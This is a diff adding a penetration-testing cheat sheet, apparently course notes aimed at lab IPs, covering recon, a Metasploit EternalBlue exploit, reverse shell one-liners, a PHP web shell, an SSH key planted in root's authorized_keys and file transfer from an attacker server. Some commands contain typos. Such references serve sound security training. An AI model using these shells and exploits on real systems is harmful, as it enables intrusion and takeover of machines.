@@ -1,0 +1,113 @@
+Basic Tools----------------------------------------------------------
+
+sudo openvpn user.ovpn		Connect to VPN
+
+ifconfig/ip a			Show our IP address
+
+netstat -rn			Show networks accessible via the VPN
+
+ssh user@10.10.10.10		SSH to a remote server
+
+ftp 10.129.42.253		FTP to a remote server
+
+tmux				Start tmux (terminal multiplex)
+
+ctrl+b				tmuxL default prefix
+
+Pentesting------------------------------------------------------------
+
+nmap 10.129.42.253		Run nmap on an IP
+
+nmap -sV -sC -p- 10.129.42.253	Run an nmap script scan on an IP
+
+locate scripts/citrix		List various available nmap scripts
+
+netcat 10.10.10.10 22		Grab banner of an open port
+
+smbclient -N -L \\\\10.10.10.10	List SMB Shares
+
+smbclient \\\\10.10.10.10\\user	Connect to an SMB share
+
+Web Enumeration-------------------------------------------------------
+
+gobuster dir -u http://10.10.10.10/ -w /usr/share/dirb/wordlists/common.txt
+
+gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
+
+curl -IL https://www.inlanefreight.com
+
+whatweb 10.10.10.121
+
+ctrl+U		view page source (in Firefox)
+
+Public Exploits--------------------------------------------------------
+
+searchsploit openssh 7.2
+
+msfconsole
+
+	search exploit eternalblue
+
+	use exploit/windows/smb/ms17_010_psexec
+
+	show options
+
+		set RHOSTS 10.10.10.10
+
+	check
+
+	exploit (run)
+
+Using Shells------------------------------------------------------------
+
+nc -lvnp 1234
+
+bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvp 1234 >/tmp/f
+
+nc 10.10.10.1 1234
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+ctrl+z then stty raw -echo then fg then enter twice
+
+echo "<?php system(\$_GET['cmd']);?>" >/var/www/html/shell.php
+
+curl http://SERVER_IPLPORT/shell.php?cmd=id
+
+Privilege Escalation-----------------------------------------------------
+
+sudo -l
+
+sudo -u user /bin/echo Hello World!
+
+sudo su -
+
+sudo su user -
+
+ssh-keygen -f key
+
+echo "ssh-rsa .....SNIP....M=user@parrot" >> /root/.ssh/authorized_keys
+
+ssh root@10.10.10.10 -i key
+
+Transfering Files--------------------------------------------------------
+
+python3 -m hhtp.server 8000
+
+wget http://10.10.14.1:8000/file.sh
+
+curl httpL//10.10.14.1:8000/file.sh -o file.sh
+
+scp file.sh user@remotehost:/tmp/linenum.sh
+
+base64 shell -w 0
+
+echo foVMR...SNIO...InmDwU | base64 -d > shell
+
+md5sum shell
+
+
